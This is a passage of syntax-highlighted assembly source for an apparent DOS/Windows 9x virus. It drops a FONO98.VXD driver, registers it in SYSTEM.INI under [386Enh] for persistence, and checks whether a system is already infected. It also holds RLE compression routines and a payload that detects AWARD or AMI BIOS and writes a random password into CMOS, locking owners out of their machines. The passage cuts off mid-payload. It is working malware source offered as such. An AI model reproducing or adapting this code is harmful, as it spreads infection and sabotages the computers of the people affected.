           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">VxDSize2</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;write vxd</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
     </span><span class="sc5">InfectSYSTEMINI</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">WinDX</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">WinDS</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
     </span><span class="sc5">NextLtr</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">CopyStr</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextLtr</span><span class="sc0">                         </span><span class="sc1">;copy windows dir to buffer</span><span class="sc0">
     </span><span class="sc5">CopyStr</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;again</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">SysIni</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;append system.ini</span><span class="sc0">
     </span><span class="sc5">NxtLetter</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">lodsb</span><span class="sc0">
           </span><span class="sc6">stosb</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">NxtLetter</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">ReturnBack</span><span class="sc0">                       </span><span class="sc1">;open system.ini</span><span class="sc0">
           </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDHere</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Enh386</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
     </span><span class="sc5">Search</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;search for right section</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Found</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
     </span><span class="sc5">Found</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">pusha</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Device</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">;already infected?</span><span class="sc0">
           </span><span class="sc6">popa</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VxDHere</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4200h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">19</span><span class="sc0">
           </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Device</span><span class="sc4">]</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;write our device line</span><span class="sc0">
           </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
     </span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
     </span><span class="sc5">ReturnBack</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c00h</span><span class="sc0">
           </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;exit to DOS</span><span class="sc0">
     </span><span class="sc5">Uncompress16</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
             </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">;uncompress RLE</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                        </span><span class="sc1">;(hmm... a bit redundant...)</span><span class="sc0">
             </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
     </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">lodsb</span><span class="sc0">
             </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
             </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Store</span><span class="sc0">
             </span><span class="sc6">lodsw</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
             </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
     </span><span class="sc5">Store</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">stosb</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ff00h</span><span class="sc0">
             </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">AbortNow</span><span class="sc0">
             </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
             </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">
     </span><span class="sc5">AbortNow</span><span class="sc4">:</span><span class="sc0">
             </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
             </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
             </span><span class="sc6">ret</span><span class="sc0">
     </span><span class="sc5">Enh386</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[386Enh]'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
     </span><span class="sc5">Device</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'device=fono98.vxd'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
     </span><span class="sc5">WinDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'windir='</span><span class="sc0">
     </span><span class="sc5">SysIni</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\SYSTEM.INI'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">SysDir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">'\SYSTEM\'
</span><span class="sc0">     </span><span class="sc5">VxDName</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FONO98.VXD'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">WinDS</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">WinDX</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">UpDown</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Compressed</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">Buffer</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">64</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
     </span><span class="sc5">VxDSize2</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">VxDSize1</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc5">EndLoader</span><span class="sc0">  </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
     </span><span class="sc5">VxDHere</span><span class="sc0">    </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
     </span><span class="sc5">LoaderEnd</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">


</span><span class="sc5">BeginProc</span><span class="sc0"> </span><span class="sc5">Compress32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">;compressor of modificated RLE</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                          </span><span class="sc1">;coded in 32bit</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
  </span><span class="sc5">@1</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
         </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@2</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">
  </span><span class="sc5">@2</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@4</span><span class="sc0">
  </span><span class="sc5">@5</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
         </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
         </span><span class="sc6">stosw</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
  </span><span class="sc5">@4</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">stosb</span><span class="sc0">
  </span><span class="sc5">@6</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@1</span><span class="sc0">
  </span><span class="sc5">@3</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
         </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">EndProc</span><span class="sc0"> </span><span class="sc5">Compress32</span><span class="sc0">

       </span><span class="sc5">Killer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'REVENGE.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

       </span><span class="sc5">KCode</span><span class="sc0"> </span><span class="sc9">Equ</span><span class="sc0"> </span><span class="sc9">This</span><span class="sc0"> </span><span class="sc10">Byte</span><span class="sc0">
     </span><span class="sc5">Payload</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0f000h</span><span class="sc0">                         </span><span class="sc1">;our copyrighted payload :)</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
           </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
     </span><span class="sc5">scan</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">pusha</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">award</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
           </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">cmpsb</span><span class="sc0">                          </span><span class="sc1">;search ROM for AWARD signature</span><span class="sc0">
           </span><span class="sc6">popa</span><span class="sc0">
           </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">award_psw</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">scan</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002fh</span><span class="sc0">                       </span><span class="sc1">;if not found, assume AMI BIOS</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2dh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">step1</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00010000b</span><span class="sc0">                    </span><span class="sc1">;Put a random password in CMOS</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">step2</span><span class="sc0">                          </span><span class="sc1">;memory, for ask it always,</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">                         </span><span class="sc1">;and correct checksum</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0038h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndpsw</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rndpsw</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3fh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">hehehe</span><span class="sc0">
     </span><span class="sc5">award_psw</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002fh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;Put the password in CMOS</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">                         </span><span class="sc1">;for AWARD BIOS machines</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">step1</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">step2</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1bh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">step1</span><span class="sc0">
           </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00100000b</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">step2</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2fh</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7dh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7eh</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
